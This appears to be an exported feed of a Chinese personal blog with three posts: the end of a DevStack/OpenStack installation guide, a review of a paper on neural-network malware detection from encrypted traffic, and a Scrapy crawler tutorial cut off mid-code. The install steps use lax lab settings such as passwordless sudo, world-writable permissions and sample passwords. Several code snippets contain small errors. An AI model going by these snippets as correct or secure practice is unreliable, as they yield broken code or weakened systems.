创建stack用户并赋予权限这一步我们需要创建一个stack用户，这是因为devstack在部署openstack时需要系统权限，但又不能以root的身份去执行devstack的脚本，所以我们创建一个stack用户，并赋予它root权限 而在我们下载的devstack中就直接有创建stack用户的脚本，我们可以直接拿来： sudo devstack/tools/create-stack-user.sh 然后是赋予stack用户权限： echo &quot;stack ALL=(ALL) NOPASSWD: ALL&quot; | sudo tee /etc/sudoers.d/stack 这一步可能会出问题，所以最保险的方法还是进入/etc/sudoers, 在 root ALL=(ALL:ALL) ALL 后添加 stack ALL=(ALL:ALL) ALL, 然后保存。 最后切换到stack用户： sudo -i su stack 修改devstack文件夹权限这里我们需要修改devstack文件夹的权限，使其可以被stack用户操作： chown -R stack:stack /home/devstack chmod 777 /dev/pts/0 修改devstack配置文件local.conf这一步通过下面的方法生成local.conf，local.conf是devstack的安装参数： cp samples/local.conf ./ sudo vim local.conf 这个配置文件网络上有很多版本，我来来回回试了很多个都失败了，最后找了一个配置成功了。我提供一下我配置的local.conf: [[local|localrc]] HOST_IP=127.0.0.1 # Minimal Contents # ---------------- # While ``stack.sh`` is happy to run without ``localrc``, devlife is better when # there are a few minimal variables set: # If the ``*_PASSWORD`` variables are not set here you will be prompted to enter # values for them by ``stack.sh``and they will be added to ``local.conf``. ADMIN_PASSWORD=nomoresecret DATABASE_PASSWORD=stackdb RABBIT_PASSWORD=stackqueue SERVICE_PASSWORD=$ADMIN_PASSWORD # ``HOST_IP`` and ``HOST_IPV6`` should be set manually for best results if # the NIC configuration of the host is unusual, i.e. ``eth1`` has the default # route but ``eth0`` is the public interface. They are auto-detected in # ``stack.sh`` but often is indeterminate on later runs due to the IP moving # from an Ethernet interface to a bridge on the host. Setting it here also # makes it available for ``openrc`` to include when setting ``OS_AUTH_URL``. # Neither is set by default. #HOST_IPV6=2001:db8::7 # Logging # ------- # By default ``stack.sh`` output only goes to the terminal where it runs. It can # be configured to additionally log to a file by setting ``LOGFILE`` to the full # path of the destination log file. A timestamp will be appended to the given name. LOGFILE=$DEST/logs/stack.sh.log # Old log files are automatically removed after 7 days to keep things neat. Change # the number of days by setting ``LOGDAYS``. LOGDAYS=2 # Nova logs will be colorized if ``SYSLOG`` is not set; turn this off by setting # ``LOG_COLOR`` false. #LOG_COLOR=False # Using milestone-proposed branches # --------------------------------- # Uncomment these to grab the milestone-proposed branches from the # repos: #CINDER_BRANCH=milestone-proposed #GLANCE_BRANCH=milestone-proposed #HORIZON_BRANCH=milestone-proposed #KEYSTONE_BRANCH=milestone-proposed #KEYSTONECLIENT_BRANCH=milestone-proposed #NOVA_BRANCH=milestone-proposed #NOVACLIENT_BRANCH=milestone-proposed #NEUTRON_BRANCH=milestone-proposed #SWIFT_BRANCH=milestone-proposed # Using git versions of clients # ----------------------------- # By default clients are installed from pip. See LIBS_FROM_GIT in # stackrc for details on getting clients from specific branches or # revisions. e.g. # LIBS_FROM_GIT=&quot;python-ironicclient&quot; # IRONICCLIENT_BRANCH=refs/changes/44/2.../1 # Swift # ----- # Swift is now used as the back-end for the S3-like object store. Setting the # hash value is required and you will be prompted for it if Swift is enabled # so just set it to something already: SWIFT_HASH=66a3d6b56c1f479c8b4e70ab5c2000f5 # For development purposes the default of 3 replicas is usually not required. # Set this to 1 to save some resources: SWIFT_REPLICAS=1 # The data for Swift is stored by default in (``$DEST/data/swift``), # or (``$DATA_DIR/swift``) if ``DATA_DIR`` has been set, and can be # moved by setting ``SWIFT_DATA_DIR``. The directory will be created # if it does not exist. SWIFT_DATA_DIR=$DEST/data API_WORKERS=1 GIT_BASE=http://git.trystack.cn NOVNC_REPO=http://git.trystack.cn/kanaka/noVNC.git SPICE_REPO=http://git.trystack.cn/git/spice/spice-html5.git disable_service tempest heat cinder 保存虚拟机快照这一步十分十分十分十分关键！！完成了上面所有步骤，接下来我们就要开始直接安装了，我们可能会失败好几次，所以保存现在我们做好的环境十分重要。不然devstack部署openstack彻底失败后，你也不想彻底失败后从头再来配置一遍环境吧？ 开始安装完成了上面所有的步骤，那就开始安装吧，朋友们，万里长征开始了。（建议下载一部电影，因为部署过程很漫长，大概要40多分钟，而且中途任何一个过程都可能失败而退出安装） 执行： ./stack.sh 安装的开头要求你输入几次密码，然后就自己开始跑脚本。 问题在部署的过程中，我遇到了好几次问题，来来回回大概部署7到8次才最后成功。如果你按照我上面的步骤进行，遇到的问题大概有下面几种。 pip无法安装指定版本库这个问题还挺坑的，脚本会提示你pip版本太低，无法下载指定版本的python库，并提示你先更新pip版本。当时我按提示更新pip版本到最新，重新部署后它又提示我pip版本太低…后来发现，是因为我在部署前没有更新pip，版本的缓存被devstack记录下来了，所以每次部署又会回退到上一个版本。 如果你按照我上面的步骤，提前更新了pip版本，应该不会遇到这个问题。如果遇到了，用以下方法解决：看看出错时的安装库和指定版本，在新一次部署前先把这个库下载安装了： pip install scipy == 0.15.1 这样部署时检测到这个库的版本已经安装了，就会跳过检测，继续往下部署，就不会出问题了。 time out这个估计是最常见的问题，因为部署在虚拟机中，很可能出现网络不稳定的情况，一段时间无法下载后就会报time out的错，然后退出安装。这个问题有可能是你本身网络的问题，也有可能是对方源的问题，这很常见，很多人今天安装失败了，然后第二天就安装成功了。所以，这个问题的解决方法：重复安装，然后看脸。 如果你按照我上面的步骤部署，遇到time out的几率会低很多，我部署时只在开始时遇到过一次time out，后面基本上没遇到。 其他问题其实部署的过程中还遇到了很多奇奇怪怪的问题，一般在google上能直接搜到解决方案，学会利用搜索引擎也是一项十分重要的技能。如果到后来，你试了很多解决方案导致系统环境变得很奇怪时，尝试卸载部署环境并且重新开始部署： ./unstack.sh ./clean.sh 然后再次安装： ./stack.sh 如果连卸载都处理不了，整个虚拟机环境都很奇怪时，直接还原快照（所以前面提醒了好多次做快照）。 后记其实到最后，我的devstack还是显示部署失败了。 stack.sh failed: full log in /opt/stack/logs/stack.sh.log Error on exit 然而我访问openstack网页端时却发现其实已经部署成功了。我在网上查了这个问题，很多人也遇到了，但是并没有解决的，因为其实已经部署完成了，可能有一些小问题，但是并不影响使用，所以就没有理他。而在后面测试openstack的时候，发现了无法分配浮动ip的问题，不知道这是不是部署失败的后遗症： Error: Failed to perform requested operation on instance &quot;vm1&quot;, the instance has an error status: Please try again later [Error: Host &apos;ccrfox105&apos; is not mapped to any cell]. 对于这点我还是找到了解决方案： cd devstack source openrc voidking project source openrc admin admin nova-manage cell_v2 discover_hosts 之后还遇到了网络不通的情况，查过资料后采用创建安全组的方式解决。所以感觉最后的部署失败虽然不影响openstack的使用，但还是留下了不少隐患，不过对我们体验openstack来说，还是没什么问题的。","tags":[{"name":"私有云","slug":"私有云","permalink":"http://yoursite.com/tags/私有云/"},{"name":"openstack","slug":"openstack","permalink":"http://yoursite.com/tags/openstack/"}]},{"title":"基于神经网络的加密网络流量分析恶意软件检测","date":"2018-09-05T03:39:32.000Z","path":"2018/09/05/xueshu/","text":"论文：Malware Detection By Analysing Encrypted Network Traffic with Neural Networks作者：Prasse, Paul; Machlica, Lukáš; Pevný, Tomáš; Havelka, Jiří; Scheffer, Tobias地区：欧洲，德国时间：2017来源：EI 介绍恶意软件的目的 侵犯隐私 获取密码 加密文件来进行勒索 点击-诈骗 政治推广 网络流量分析的作用 对杀毒软件进行补充 最小化管理开销 能够封装到网络服务与云服务 预测多态性恶意软件与新型恶意软件 为什么要对加密网络流量进行分析HTTP的payload能够通过HTTPS协议加密来预防常规流量分析，知名网站如Google、Facebook等都是默认使用HTTPS。而根据统计，截止至2016年6月，已经大约45%的网站（持续增长中）使用HTTPS加密。 HTTPS与网络监控工具HTTPS:使用了SSL/TLS协议对HTTP进行了加密。网络监管工具（observer）：将客户端与主机端的交互全部记录，并存储成log文件。在HTTPS中，由于数据包的头部和URL会被加密，恶意软件检测策略： 基于被用户访问的主机域名 基于时间和数据量的上下行流的统计性规律 如何提取主机域名特征 低维的神经嵌入域名字符串 人工设计域名特征 选用哪些机器学习模型 LSTMS（长短期记忆网络） Random Forests（随机森林） 如何处理机器学习中数据标签问题 在客户端配置VPN 观察可执行文件(exe)与网络数据流之间的关联 使用反病毒工具进行识别及打标签 小结该章节简要的介绍了文章的目的，研究背景，以及一些基本概念。章节的后半段作者似乎急迫地想要提出文章所采用的思想与技术，从而省略了一些基本性的表述，初读之下确实令人有些费解。不过好在接下来的章节作者对简介中提出的思想与技术进行了一一描述。 相关工作在简介中提到，网络监管工具能够记录网络交互，存储成log文件。log文件对本文来说是重要资源，因为能够从log中提取出许多重要信息，进而从信息中提出特征。文章说明了log文件的意义与采用LSTMS的意义。 HTTP logs 识别Command-and-control类型服务 恶意软件的无监督检测 使用域名黑名单作为标签的可监督检测 包含完整的URL，可以提取特征 拥有比HTTPS更多的信息 HTTPS logs 识别应用层协议 识别web服务器提供的应用 识别与恶意软件相关的服务 神经网络（LSMTS） 需要识别客户机是否感染（涉及到多实例学习问题） 能够观察exe可执行文件与数据流之间的联系 与Prasse提出的随机森林进行对比 能够处理连续输入与解释长期依赖性 在安全领域中曾被入侵检测使用过 小结该节作者介绍了为何要对HTTP和HTTPS的logs进行分析，可以看出log文件对于本文来说是一项重要的信息资源，对HTTP与HTTPS的logs分析都有不同的意义。为了解释对log文件的分析确实解决了一些实际问题，作者还引用了不少参考文献来进行印证。本章作者还说明了为何要使用神经网络（LSMTS）算法，列举了原因与优势，并提出要与随机森林算法做比较。 操作环境该章节主要介绍了应用与数据收集的操作环境。在章节2种提到log文件是一项重要信息资源，本章就讲解了logs相关的生成环境等等，而本章节也是对数据收集进行了详细描述。 CWS服务CWS（Cloud Web Security）是一种保证组织内电脑安全的服务软件，其在组织私有网络与因特网之间提供了接口，其特点大致如下： 用户电脑要配置VPN来连接CWS服务 CWS服务可以运行组织的安全策略，如根据主机域名和安全策略来阻挡HTTP与HTTPS请求 当检测带客户机上运行恶意软件时发出警告 误报比例低 文章在这里详细地介绍了一下CWS服务，因为在上文中提过网络监控工具，在研究中CWS就充当了网络监控工具，其可以产生logs。其产生的logs过程大致如下： logs文件中的lines会作为输入服务于建模。 数据采集前提：直接舍弃log中的HTTP数据，只保留HTTPS数据。核心：CWS作为中间人进行数据收集流程： 上图的流程只能用以收集少量训练集，因为大多数加密流还是没法解密的，无法直接打标签。 数据打标签Virustotal.com：提供web服务，使用60种反病毒策略对提交的exe文件或exe文件的hash key进行安全检测。由于上面的数据采集中使用VPN客户端对exe的hash key进行了采集，因此文章直接提交exe的hash key进行检测，标签策略如下： 数据集类型 current data: 从171个大小不同的网络中收集，收集于2016年6月中的5天，一共44,348,879条数据流，133,473个客户端 future data: 从169个大小不同的网络中收集，收集于2016年9月中8天，一共149,005,149条数据流，177,738个客户端 training data for domain-name features: 从21个大小不同的网络中收集，收集于2016年2月到4月内的14天。 这里专门提了一下隐私保护，因为国外即使是科研也不能侵犯用户隐私，对隐私这一块看得很重，所以作者提了一下这些数据都是匿名采集的，没有任何用户的个人信息。 数据质量分析数据集在采集完成时用Virustotal进行了一次打标签，而文章在2017年2月对数据集的标签进行了一次复查，以此来确认标签的稳定性。最终结果为下表（混淆矩阵）： （uncertain：不确定，unknown：无法检测，benign：良性，malicious：恶性） 最后是采用2017年2月的标签作为最后的实验标签。根据统计，current data中一共包含20130种hash，350,220条恶意数据流和43,150,605条良性流；future data中一共包含27,263种hash，955,037条恶意数据流和142,592,850条良性流。 而恶意软件家族的统计如下图： 其中PUA（潜在垃圾应用）的特征如下： 完全由创造者决定如何运行（如改变浏览器设置和起始页，安装工具条和浏览器扩展，显示广告或泄密码给攻击者） 免费/共享 难以卸载 小结本章作者主要对cws服务进行了说明，并介绍了其实如何在网络中收集实验数据的。cws是文章重要的原始数据收集来源，有一些数据在收集后可以直接使用cws打标签，但大多数不行。所以文章借助了Virustotal.com站点提供的反病毒接口来完成数据标签工作。文章一共设置了3个数据集，用于不同实验。在本章末尾，作者对数据标签的质量进行了一次复测，并将复测结果作为最终的实验标签，分析了标签的迁移性以及恶意软件家族种类统计。 客户端恶意软件检测问题该章节明确了研究目标，在于要对用户主机是否运行恶意软件进行识别，该章节从单独的流量识别转移向了用户主机层面。换个说法，单独的流量识别层面在于对一条新输入的流量进行识别，打上恶意或良性的标签，而该章节将其转向了主机层面，通过主机产生的流量集作为输入判断该主机是否运行了恶意软件。 基础定义环境：设置私有网，用户安装VPN=入网，在该网络中做实验采集实例：每台用户主机（通过IP和VPN名定义）每24小时视作一个独立实例（instance）实例格式：{x1,x2,…,xt}, 其实就是用户主机1天内产生的数据流顺序集合，混合了主机中多种应用产生的流量标签： 至少一个恶意应用产生了任何流量 ——&gt; instance标记为positive 至少一个良性应用产生了任何流量（无任何恶意应用）——&gt; instance标记为negative 识别：模型f接收{x1,x2,…,xt}格式的示例，通过计算 f(x1,x2,…,xt) 得出一个分数(score)，这个分数将会与阈值T比较： score &gt; T （识别为positive） score &lt; T （识别为negative） 阈值T会被调整来使误报降低。 性能评估：Precision-Recall（召回率曲线）+ ROC曲线 性能评估召回率曲线 Recall R（回调率）：在本文中，可以称为查全率。 Precision P（精确度）：在本文中，可以称为查准率。 为了读者更好地理解，我修改了公式图： R@x%P: 在指定精确度x%下的回调率值。由于根据阈值的调整，回调率与精确度也会随之改变，该表达代表了在精确度为x%的情况下，回调率的值。 召回率曲线展示了通过阈值T的调整，Recall与Precision的关系图。 ROC曲线 False-positive Rate RFP（良性回调率）：在本文中，可以称为误报率，即良性误报为恶意的比例。公式：RFP = FP / FP + TN ROC曲线展示了通过阈值T的调整，RFP与Recall的关系图。 Time To detection用以评估恶意程序发送第一个恶意流到对其检测的时间间隔。 精确度与误报率文章在本章最后强调了一下两者的区别以及重要性。实际上，在实际应用中低误报率比高精确度更重要，因为当许多良性流被当做恶意流被阻拦时，很可能会导致正常服务无法运行，阻塞网络，因此如何在保证低误报率的情况下实现高精确度是一直以来研究的重点之一。 小结这一章主要就是对评估方法进行了讲解，因为实验部分使用到ROC曲线和Precision-recall曲线，以及R@x%P和Time To detection，所以考虑一些读者的阅读能力（没错就是我这种），作者干脆用了一个章节把这些讲明白了。 特征特征一直以来都是机器学习文章的核心章节，该文章提出了多种不同类型的流量特征。 流量特征(Flow Features)对于每条流来说，可以直接获取的信息为： IP + VPN名 主机地址 端口号 时间戳 出/入数据量 持续时间 因此文章选择从每条流中提取出的流特征为： 持续时间的对数变化 发生和接收字节数的对数变化 持续时间 与上一条流之间的时间差 域名特征(Domain-Name Features)文章提到，每条流都会包含IP地址，对于大多数HTTPS请求来说，主机域名是可视的，且IP地址也会包含在主机域名字符串中。文章选择从主机域名中提取出一些特征。 工程特征（Engineered Features）这里作者参考了由Franc在其论文中提出的60种针对URL字符串的特征，包括：元音变化比例、域名与子域名中个别字符的最大出现率，不含元音的最长子串，非base64编码的字符串，non-letter类型字符出现率，等等。作者选择把这60种特征全都提出作为自己的建模特征。 字符的n-gram特征（Character n-gram Features）n-gram是一种自然语言处理算法，在文章中，其将域名字符串分解为若干重叠字符串，每个分解出来的gram称为一个特征。n-gram的具体应用可以参考 自然语言处理中的N-Gram模型详解，我这里只做简单的讲解。 举例：”example”在n-gram下分解出特征： 2-gram：&quot;ex&quot; &quot;xa&quot; &quot;am&quot; &quot;mp&quot; &quot;pl&quot; &quot;le&quot; 3-gram：&quot;exa&quot; &quot;xam&quot; &quot;amp&quot; &quot;mpl&quot; &quot;ple&quot; 4-gram：&quot;exam&quot; &quot;xamp&quot; &quot;ampl&quot; &quot;mple&quot; 假设使用2-gram，新输入的字符串中命中特征的标记为1，未命中标记为0。例如输入的字符串为”apple”,经过分解为： &quot;ap&quot; &quot;pp&quot; &quot;pl&quot; &quot;le&quot; (命中了pl和le) 因此最终得到的向量为[0,0,0,0,1,1]，接下来可能根据不同的权重计算出一个分数值来。 可以看到”ap”和”pp”不在特征中，这是因为数据集太小，当训数据集足够大，特征基本上都会被采集。 文章提到，通过提取，在2-gram下一共得到了1,583个特征，3-gram下一共得到了54,436个特征，4-gram下得到了1,243,285个特征。由于3-gram和4-gram给机器带来了太大的计算负担，于是作者最终选择了2-gram提取的特征。 神经域名特征（Neural Domain-Name Feature）神经语言模型(Neural language models)：为了弥补N-gram在相似单词编码上的漏洞。神经嵌入(Neural embedding)：为了降低高维度的特征数量灾难。连续词袋结构(Continuous bag-of-words architecture): 输入层为独热编码（one-hot code），n-gram的n为3，一共使用了100个隐藏层（效果最佳），且输入层与隐藏层全连接。平均层(averaging layer)用于均衡所有隐藏单元的激活。 训练集：training data for domain-name features数据集中数据，Top500,000来自alexa.com。输出：一个神经域名空间向量的表达式 用户分类器使用了LSTMs作为用户分类器，并以随机森林作为比较。每个LSTM单元拥有记忆细胞来存储推论，而后面的单元可能会调用这个记忆细胞，所以LSTMs可以在顺序输入中考虑长期依赖关系。 小结这章就是专门用来介绍特征的，作者分了两类特征：流量特征和域名特征。流量特征是从数据流信息中提取的特征，域名特征是从主机域名中提取的特征。域名特征作者还预备了3种类型，分别是工程特征、n-gram特征与神经域名特征，作者在后面的实验里会比较这三种类型，然后选择最优秀的作为域名特征。 实验主机域名特征选择在特征章节中，一共提出了3种类型的特征：工程特征、n-gram特征以及神经域名特征。在第一个实验中，主要是对这种类型的特征进行比较，从而挑选出最好的一种进行接下来的实验。 数据集：860,268个良性（negative）域名与1,927个恶意（positive）域名。这里的数据集文章并没有说明其采集来源，根据推测应该是一些公开网络资源，其在采集后打标签的标准： 被恶意软件调用比被良性软件调用更频繁 ——&gt; 标记为positive 被良性软件调用比被恶意软件调用更频繁 ——&gt; 标记为negative 文章提到，有一部分域名（大约3,490个）同时被恶意软件和良性软件频繁调用，这里大部分都是为了恶意目的而注册的域名，而少部分是一些标准服务（google地图，wordpress的api等）。 训练集：75%的数据测试集：25%的数据（训练集和测试集完全独立，中间没有任何重复的数据。）机器学习算法 ：随机森林（Random Forest）实验结果： 可以看到，在各查准率标准下，使用Nerual（神经域名特征）的查全率都是最高的。本章还提到Nerual到达次数据是在神经语言模型的参数调整到最佳的情况下完成的：初始n-gram的n为6，平均4个相邻字符取一个gram，最终的空间向量表达维数设为100。文章表示接下来的实验会用神经域名特征。 实验还对实验结果进行了更深层的分析，我们知道，随机森林最终分类标准是由其中的所有决策树投票决定的，因此每次分类都会有一个百分比分数值。研究发现恶意分数为0的都完全安全域名，恶意分数低的域名包括中小企业域名，博客，学校学院主页，游戏网站，Google子域名以及政府部门，而恶意分数高的域名包括纯数字IP地址，云服务，YouTube和Facebook内容传输网络的子域名，没有主机可见内容和一看就是为了恶意目的注册的域名。文章列举了恶意分值最高的域名： 算法与特征种类选择在经过第一个实验后，域名特征已经确定为神经域名特征。在第二个实验里，文章要比较两种机器学习算法（LSTMs和RF）哪个效果更好，流量特征以及域名特征哪个效果更好。实验数据集：current data实验方法：十折交叉验证实验结果： （图中n代表Neural特征，f代表flow特征） 可以从图中看到，单独使用流量特征时，两种算法的表现都很差，而使用组合特征（n+f）时，两种算法的表现都是己方表现最优秀的。而对实验结果来说，LSTM +（n+f）明显是表现最好的那一种，因此接下来的实验只使用LSTM算法加上两种特征类型的组合。 恶意软件进化识别在上面两个实验中，最终选择的算法与特征。第三个实验将对所建立的机器学习模型的预测能力进行评估。实验数据集：future data实验方法：使用current data作为数据集，LSTM作为机器学习算法，流量特征+域名特征作为最终特征进行训练，得到识别模型，然后用future data中的数据作为测试集来测试模型的预测性。实验结果： 图中的两条曲线，一条是使用current data数据集的十折交叉验证运算出的对比曲线，另一条是用future data 实验出的测试数据。在文章的解释中，由于随着时间和公司的变化，恶意软件的流行度也在不断变化，所以回调率曲线的差异不能说明决策函数的恶化。而从ROC曲线可以看出，其实决策函数的恶化程度很小。（对于这个解释，我表示质疑，毕竟深度学习拥有一定的不可解释性，所以感觉这里有强行解释的嫌疑） 恶意软件家族识别这个是研究进行的第四个实验，其实实验内容和第三个实验差不多，数据集什么的都差不多，只是关注点不同。第四次实验着眼而对不同恶意软件家族的识别效果，实验效果如下： 文章解释说，个别组的数据实例太少，所以Precision-recall中的曲线不能直接比较，意义不大（=。=！！无语了，又是这个解释，那你画这个图干啥）。在ROC曲线中可以看到，决策函数对于大部分的恶意软件家族的识别曲线具有一定相似性，文章还解释了ROC中那条诡异的黄色折线，说是因为只有7个实例才会这样。 平均检测时间这是最后一个实验，研究的是在不同阈值T下，恶意软件产生第一个流量到被识别出来的时间间隔。这里应该是将训练好的模型放入实际环境进行测试了，实验结果如下： 平均时间长大约是90min。 结束对文章进行一个总结，首先使用神经语言模型将域名转化成了一个低维度的特征表达式，而经过实验证实这种特征方式比其他两种域名特征方式更优秀。为了给数据打标签，文章借助了由VirusTotal.com提供的恶意软件检测接口，并在多个月后对数据的标签进行了复检。文章比较了LSTMs算法与随机森林算法建立的模型性能，发现LSTM的性能更加优秀，且将域名特征和流量特征结合后的特征明显优于这两种独立特征。实验显示文章提出的模型对未知的恶意软件有不错的识别率，且涵盖不同的恶意软件家族，实际环境中识别的时间间隔大约为90min。 WhiteRabbit评论： 该文章来源于顶会论文集，水平层面确实很高。其实这篇文章的优点和缺点我都在上文中表达出来了。对我来说，其中最值得借鉴的地方在于其评估实验的方式：Precision-recall图和ROC图，感觉以后我写的论文可以借鉴这种评估方式，看起来很高大上。然后实验的方式也很值得借鉴，这种有节奏地比较并按顺序进行的实验方式可以让实验逻辑性很高。其实，在实验多走一步的思路也值得思考，比如第一次实验中对恶意域名分值的深一步分析，列举出最高分的几个域名。实际上这里的研究并没啥意义，对文章实验的研究也没什么意义，不过可以感觉的是，这样一写就能明显让人相信你是认真做了实验的，实验的可信度得到提升。由于是顶会的论文，技术啊，思想啊什么的我就不说，肯定是很牛掰的，根本不用我夸，而这篇文章对于我论文的写作借鉴意义比那些更大。不过文章也是存在着一些问题，比如来自Precision-recall图的怨念，强行解释其为什么没用，我想是不是直接删了更好？还有一些地方，文章并没有解释清楚，上文你们能看得那么顺畅是因为其中加入了我的一些推测，比如training data for domain-name features这个数据集怎么来的根本没讲啊，还有最后那个实验的时间数据是在什么环境下得到的也没说，以及那个神经域名特征最后的空间向量表达式到底长啥样也不知道。还有文章的结构也是迷，主要还是标题的迷惑性太大，第二章我以为是讲日志分析的，讲着讲着讲着蹦出个算法说明；第三章我以为是介绍实验和操作环境的，结果变成了数据收集以及分析；第四章我以为是在用户恶意软件检测时出现的问题，结果全章给我讲评估方法。第五章也是讲特征，讲着讲着蹦出个分类器。所以文章的结构对于第一次阅读的人真的很不友好，说实话我一共看了4遍才吃透了这篇文章，看看停停了很久才写出篇文章，希望能给于流量研究领域的同行们一些微薄的帮助。拜拜，改论文去啦~ 文章作者：WhiteRabbit来源：blog.whiterabbitxyj.com转载请标注原文和作者。","tags":[{"name":"学术","slug":"学术","permalink":"http://yoursite.com/tags/学术/"},{"name":"论文","slug":"论文","permalink":"http://yoursite.com/tags/论文/"}]},{"title":"从零开始接触Scrapy爬虫框架到构建一个通用实用型模板","date":"2018-07-09T03:39:32.000Z","path":"2018/07/09/scrapy/","text":"爬虫是网络信息收集最重要的工具之一，而我之前一直都用自己手写的爬虫，感觉挺好用也一直没学爬虫框架。由于研究需要，最近又要接触爬虫，于是索性学了一下爬虫框架Scrapy，看看为什么这么多人支持该框架，他又给我们编写爬虫带来了哪些便捷。 Scrapy简介Scrapy是一个为了爬取网站数据，提取结构性数据而编写的应用框架。可以应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。其最初是为了 页面抓取 (更确切来说, 网络抓取 )所设计的， 也可以应用在获取API所返回的数据(例如 Amazon Associates Web Services ) 或者通用的网络爬虫。 Scrapy的安装Scrapy是基于python实现的，因此推荐使用pip安装，具体语句参考： sudo pip install virtualenv #安装虚拟环境工具 virtualenv ENV #创建一个虚拟环境目录 source ./ENV/bin/active #激活虚拟环境 pip install Scrapy Scrapy整体架构 Scrapy由5个部分构成，分别是：（1）Scrapy Engine，引擎，相当于整个爬虫框架的大脑，其连接着其他四个模块，控制着整个框架的数据流动、指令触发事件等等。（2）Spiders，爬虫，这是由用户自己实现的部分，需要注意的是，在一个爬虫框架中可以存在很多爬虫，而每个爬虫都负责处理某个或某几个特定网站。（3）Scheduler，调度器，负责管理由spider发起的request请求，将其入队，当引擎请求时将其传递。（4）Downloader，下载器，负责获取页面数据并提供给引擎，而后提供给spider。（5）Item Pipeline，管道，当页面被爬虫解析所需的数据存入Item后，将被发送到项目管道，并经过几个特定的次序处理数据，最后存入本地文件或存入数据库。 而一个完整的流程大概是这样的：Spider从自己的url列表中取出要爬取的url，将request请求传递给Scheduler，调度器经过调度将请求传递给Downlader，下载器会将整个页面的数据下载下来，并封装成应答包(Response)，再回传给Spiders，爬虫将下载的数据整理为Item数据类型，最后交给Pipeline保存。整个过程中，引擎处理着每个模块之间的交互和数据流动，而调度器一般在多个爬虫同时传递request请求时才显现出其重要性。 其实在框架图中可以看到，还存在两个中间件：Downloader middlewares（下载中间件）和Spider middlewares（爬虫中间件），这两个中间件并不影响整个框架的运行，其为用户自定义的模块，可以不实现，而其存在的意义在于扩展Scrapy功能，比如IP代理池等等。 Sracpy代码目录结构在编写爬虫前需要知道的是，模块中Engine、Scheduler、Downloader是Scrapy自己实现的，并不需要我们去编写，我们需要实现的是Spiders和Item Pipeline。 首先，使用命令创建一个Scrapy项目: scrapy startproject malware 上面的命令会生成一个目录，目录结构如下： malware/ scrapy.cfg #包含着整个项目的配置 malware/ __init__.py items.py #Spiders的Item，定义了要存储数据的数据结构 pipelines.py #Item Pipeline的实现，处理Spider传递的Item settings.py #Spider的设置文件 spiders/ #存放着所有的Spider __init__.py ... 从零开始写第一个爬虫1. 定义Item写爬虫的第一步，先确定你要爬取数据的结构，Items是将要装载抓取的数据的容器，它工作方式像 python 里面的字典。以malware-traffic-analysis.net为例，我想要抓取他们主页的信息，包括url，title，name，那么定义如下： from scrapy.item import Item, Field class MalwareItem(Item): name = Field() #存储站点名 title = Field() #存储主页标题 url = Field() #存储url 很简单的代码，但是这个Item会被Spider调用作为存储数据的容器并传递给管道，最后在管道中处理。 2. 编写Spiderspider是由用户自编写的爬虫具体实现代码，其中定义了初始url，如何跟踪链接，如何解析网站数据等等，一个简单的demo如下，首先我们在spiders目录中新建一个文件名为malware_spider的python文件，然后输入代码如下： import scrapy class malwareSpider(scrapy.Spider): name = &quot;malware&quot; allowed_domains = [&quot;malware-traffic-analysis.net&quot;] start_urls = [ &apos;http://www.malware-traffic-analysis.net/2018/index.html&apos; ] def parse(self, response): filename = response.url.split(&quot;/&quot;)[-2] with open(filename, &apos;wb&apos;) as f: f.write(response.body) 简单解释一下上面的demo，首先定义了一个类去继承Spider类，并在这个类中实现具体的爬虫功能，其中参数解释如下：（1）name：爬虫的名字，在启动爬虫的时候需要用到（2）allowed_domains：爬虫可行域，定义了爬虫允许的爬取域（3）start_urls：定义了初始url的列表，爬虫会依次爬取而对于parse函数，这是Spider类中最重要的一个函数，其是一个回调函数，在每个下载器完成下载后，会将数据内容封装成一个Response，并将其传递给parse函数进行处理。在上面的demo中，parse就进行了一个简单的处理，截取url内容并以此为名保存在本地。我们在爬虫根目录使用下列命令启动爬虫看看效果： scrapy crawl malware 主要注意的是，本命令需要在根目录执行，就是存在scrapy.cfg文件的目录，且最后一个参数是你爬虫的名字，如我定义的爬虫名字（name）就是malware，爬虫运行过程如下: 3. 在Spider中使用Item在上面的例子中我们成功定义了Spider并让其爬取数据并保存，但是这种方式显得很直接粗漏，因此我们使用之前定义Item类来作为存储数据的容器。 3.1 提取数据在将提出的数据存入Item之前，我们需要知道如何从下载的内容中提取出我们需要的数据。首先，我们能够得到初始的数据内容为页面源码，大概长相如下： 为了更方便地从页面源码中提取数据，Scrapy提供一个Selector类来辅助数据提取。Selector类主要使用XPath和CSS表达式来进行数据提取，其可用的方法如下： xpath(): 返回selectors列表, 每一个selector表示一个xpath参数表达式选择的节点. css(): 返回selectors列表, 每一个selector表示CSS参数表达式选择的节点 extract(): 返回一个unicode字符串，该字符串为XPath选择器返回的数据 re(): 返回unicode字符串列表，字符串作为参数由正则表达式提取出来 由于本文是对html源码进行数据提取，因此使用XPath方法，而XPath的语法请参考：XPath语法，使用Selector类与XPath对上面的demo进行修改： import scrapy class malwareSpider(scrapy.Spider): name = &quot;malware&quot; allowed_domains = [&quot;malware-traffic-analysis.net&quot;] start_urls = [ &apos;http://www.malware-traffic-analysis.net/2018/index.html&apos; ] def parse(self, response): sel = scrapy.Selector(response) url = response.url title = sel.xpath(&apos;//title/text()&apos;).extract() #抓取title内容 name = self.allowed_domains[0] 3.2 使用Item在上面的源码中，我们已经实现了数据的提取，现在我们要把它存储到Item类中，实现的具体代码如下： import scrapy from malware.items import MalwareItem class malwareSpider(scrapy.Spider): name = &quot;malware&quot; allowed_domains = [&quot;malware-traffic-analysis.net&quot;] start_urls = [ &apos;http://www.malware-traffic-analysis.net/2018/index.html&apos; ] def parse(self, response): sel = scrapy.Selector(response) items = MalwareItem() item[&apos;url&apos;] = response.url item[&apos;title&apos;] = sel.xpath(&apos;//title/text()&apos;).extract() item[&apos;name&apos;] = self.allowed_domains[0] return item 可以看到，我们调用了MalwareItem类，并将提取出的数据都存入了item容器中，最后将其返回。 4. 使用Item Pipeline看到这里有些人会产生疑惑，上面的代码中，item被返回，那究竟返回到了哪呢？答案是Item Pipeline。值得一提的是，虽然Item Pipeline是五大模块之一，却并不是必须实现的模块，你可以直接在Spider的parse中直接进行数据存储等工作，且Spider默认状态下是关闭Item Pipeline的，你想要使用其必须在setting中加入一句代码来激活Item Pipeline： ITEM_PIPELINES = {&apos;malware.pipelines.MalwarePipeline&apos;: 1} 虽然可以直接在Spider的parse中直接进行数据存储等操作，但本文建议使用Item Pipeline进行数据操作，这样能够使整个框架分工更加明确与合理。在Item Pipeline中处理数据的代码如下： class MalwarePipeline(object): def process_item(self, item, spider): filename = &quot;test&quot; with 